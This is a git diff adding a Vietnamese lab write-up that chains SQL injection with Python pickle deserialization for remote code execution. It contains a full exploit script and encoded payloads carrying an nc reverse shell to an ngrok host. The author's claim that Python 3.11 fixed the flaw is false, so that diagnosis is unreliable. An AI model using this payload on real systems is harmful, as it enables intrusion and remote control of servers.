@@ -66,7 +66,75 @@ Ta sẽ chú ý vào hàm `pickle_loads(s)`
 + Không giống như bài Phineas, ở bài này hàm `pickle_loads(s)` ta sẽ không thể gọi trực tiếp, mà nó chỉ được gọi khi render giao diện, được gọi trong file `index.html` và `item.html`
 
 => Sau khi phân tích source code thì mình có thể nhận định được rằng bài này phải RCE mới đọc được Flag (vì trong code không hề có chức năng nào đọc file flag) và khả năng cao đang bị dính lỗ hổng Insecure Deserialization, bây giờ ta sẽ phải tìm cách cho payload đi qua hàm `pickle_loads(s)`, từ đó có thể RCE
-+ Ngoài Insecure Deserialization thì mình cũng nghĩ đến Blind SQLi vì database đang sử dụng Sqlite3 do task2 mình cũng đã làm và server phải có PHP. Nhưng bài này server đang chạy web bằng Python nên khả năng xảy ra lỗi này là không cao
++ Ngoài Insecure Deserialization thì bài này còn có lỗi SQL Injection và mình cũng nghĩ đến Blind SQLi vì database đang sử dụng Sqlite3 do task2 mình cũng đã làm và server phải có PHP. Nhưng bài này server đang chạy web bằng Python nên khả năng xảy ra lỗi này là không cao
+
+## Solution
+- Hàm `pickle_loads(s)` được call trong file `index.html` và `item.html`, tại đây dữ liệu truyền vào hàm để deserialize là các phần tử được truy vấn ra từ database. Trong hai file này thì ta sẽ chú ý đặc biệt vào file `item.html` vì:
++ Ta có thể tấn công SQL injection vào đây, từ đó có thể gây ra cho câu truy vấn trả về dữ liệu mà ta có thể kiểm soát (bằng cách sử dụng Union Select, các cách injection để tạo 2 câu truy vấn khác nhau sẽ bị chặn vì lý do như bên trên mình có giải thích)
+
+- Ta sẽ quay lại câu truy vấn (models.py):
+
+```
+ def select_by_id(product_id):
+     return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
+```
+
++ `product_id` sẽ được lấy trên URL khi ta view chi tiết từng sản phẩm (chi tiết trong file routes.py), đây sẽ là điểm để ta injection payload
+
+-> Ở bài lab này mình sẽ inject vào một đoạn payload chứa reverse shell đã được serialize (giống như Task 3 mình có làm) vào `product_id` trên URL để làm cho câu truy vấn SQL trả về payload của mình, từ đó khi render giao diện trong file `item.html` payload sẽ được deserialize và ta có thể RCE. Do bài này mình không thể truyền trực tiếp payload vào như Task 3 nên phải custom lại code, và từ đây hậu quả của việc không hiểu rõ về lỗ hổng này bắt đầu:
+
+```
+import pickle
+import base64
+import requests
+
+class PickleRCE(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+command = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 14769 >/tmp/f' # Reverse Shell Payload Change IP/PORT
+
+payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()  # Crafting Payload
+
+payload = f"' UNION SELECT '{payload}' --"
+
+payload = requests.utils.requote_uri(payload)
+
+print(payload)
+
+```
+Payload (Python 3.11.1):
+
+`'%20UNION%20SELECT%20'gASVcAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`
+
+Result:
+
+![image](https://user-images.githubusercontent.com/86275419/228025771-66aaaac1-4e36-4a26-a0f0-64747383dcea.png)
+
+-> Fail sau nhiều lần thử sửa payload các thử mình vẫn fail mà không biết nguyên nhân lỗi từ đâu. Sau đó mình có tham khảo các write up làm theo cũng vẫn fail, lúc này mình tưởng rằng python đã update version mới và fix lỗi này nên không khai thác được nữa mà quên mất là khi build Docker thì version Python là cố định. Để chắc chắn rằng có thể do máy mình lỗi hoặc lab đang lỗi thì mình có nhờ một người ae test thử lại và người ae mình đã RCE được thành công với cách giống hệt mình đã làm bên trên. Lúc này thì mình vẫn chưa phát hiện ra vấn đề đang ở đâu, sau một lúc nghiên cứu lại thì bằng một cách thần kì nào đấy mình lên [web ide python online](https://www.online-python.com/) gen lại payload thử lại và thành công, lúc này mình đã lấy 2 payload so sánh với với nhau và phát hiện ra 2 payload cùng một code nhưng kết quả laị khác nhau, vậy thì chỉ có thể là do version:
+
+IDE Online:
+
+![image](https://user-images.githubusercontent.com/86275419/228031083-12ed2afb-b68b-43e1-a43d-34072193f293.png)
+
+IDE myPC:
+
+![image](https://user-images.githubusercontent.com/86275419/228031388-ddc9a95c-7531-41bd-805b-d591e072e756.png)
+
+=> Python trên máy mình đang chạy version 3.11 nên lỗ hổng đã bị fix và không thể khai thác bằng cách trên, từ đoạn này mọi payload mình gen ra sẽ từ IDE online đang chạy Python version 3.8
+
+Gen lại payload với đoạn code bên trên:
+
+`'%20UNION%20SELECT%20'gASVcwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`
+
+Result:
+
+![image](https://user-images.githubusercontent.com/86275419/228033072-0e68bff4-2e5a-4470-ad3d-2b0d79d5eb9f.png)
+
+Exploit thành công
+
+
 
 
 
